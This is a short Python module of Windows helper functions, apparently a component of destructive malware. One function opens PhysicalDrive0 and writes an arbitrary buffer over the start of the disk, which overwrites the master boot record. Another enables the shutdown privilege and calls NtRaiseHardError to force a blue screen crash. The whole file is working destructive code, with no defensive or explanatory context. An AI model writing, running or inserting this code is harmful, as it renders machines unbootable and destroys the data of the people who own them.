from win32file import *
from ctypes import POINTER, byref, c_int, c_uint, c_ulong, windll

class MBR:
    def overwritew(buffer):
        hDevice = CreateFileW(r"\\.\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING,
                            0, 0)

        WriteFile(hDevice, buffer, None)

        CloseHandle(hDevice)

class System:
    def bsod(reason=0xc000007B):
            
        nullptr = POINTER(c_int)()

        windll.ntdll.RtlAdjustPrivilege(
            c_uint(19),
            c_uint(1),
            c_uint(0),
            byref(c_int())
        )

        windll.ntdll.NtRaiseHardError(
            c_ulong(reason),
            c_ulong(0),
            nullptr,
            nullptr,
            c_uint(6),
            byref(c_uint()))